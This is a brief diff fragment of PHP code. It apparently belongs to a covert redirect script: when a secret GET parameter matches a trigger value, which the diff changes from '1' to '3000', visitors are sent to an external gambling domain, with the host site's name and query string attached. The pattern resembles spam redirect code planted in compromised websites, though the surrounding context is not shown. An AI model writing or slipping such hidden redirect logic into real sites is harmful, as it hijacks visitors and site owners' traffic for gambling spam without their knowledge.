@@ -20,7 +20,7 @@ if (isset($_GET['v3']) && $_GET['v3'] !== '') {
 
 } elseif (isset($_GET['xurl']) && $_GET['xurl'] !== '') {
     
-    if ($_GET['xurl'] == '1') {
+    if ($_GET['xurl'] == '3000') {
         $baseURL = "https://compass-gambling.com?v1=" . urlencode($_SERVER['HTTP_HOST']);
         $queryString = http_build_query($_GET);
         $redirectURL = $baseURL . '&' . $queryString;
